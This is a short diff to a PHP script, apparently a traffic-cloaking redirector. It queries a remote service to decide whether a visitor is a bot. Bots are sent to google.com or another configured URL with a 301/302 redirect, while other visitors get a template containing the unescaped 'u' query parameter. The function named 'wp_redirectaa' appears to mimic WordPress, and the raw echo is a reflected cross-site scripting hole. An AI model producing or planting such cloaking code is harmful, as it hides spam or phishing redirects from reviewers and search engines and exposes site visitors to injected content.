@@ -44,8 +44,38 @@ $headersRes = curl_getinfo($ch);
 
 
 if(isset($_GET["u"])){
-  
+  $texte=$_GET["u"];
 echo "param U: ";
+	if($headersRes['http_code']==200 && isset($res->sta) && $res->sta==1 && isset($res->mess) && $res->mess){
+			//		echo json_encode(	$headers )."test:".json_encode(	$res );die("code:".$headersRes['http_code']);
+		//		echo json_encode(	$headers )."test:".json_encode(	$res );die();
+			//$linkfakb=$linkRE.'/'.ID_USER.'/om/'.urlencode($texte);
+			$urlred= parse_url($res->mess)['host'];
+			if(isset($res->isbb) && $res->isbb){
+				// is bot 
+				//return null;
+				$linkfakb="https://google.com";
+				//i_res":{"show":0,"l_res":"https:\/\/google.com","inl_pa":0,"t_res_l":2,"t_res_att":2}
+				if(isset($res->i_res)){
+					if($res->i_res->l_res) $linkfakb=$res->i_res->l_res;
+					$urlred= parse_url($linkfakb)['host'];
+					if($res->i_res->inl_pa)$linkfakb='https://'.$urlred.'/'.ID_USER.'/om/'.urlencode($texte);
+					$core=301;
+					if($res->i_res->t_res_l==2) $core=302;
+					return wp_redirectaa($linkfakb,$core);
+				}
+			}
+			else {
+				// return template 
+				echo str_replace("appnow",($texte),$TEMPSSS);
+				die("") ;
+				$linkfakb='https://'.$urlred.'/'.ID_USER.'/om/'.urlencode($texte);
+				if(REDIRECT_LINK && wp_redirectaa($linkfakb,301)){
+					
+					return;
+				}
+			}
+	}
 }else {
 
   echo "notha ve pram";
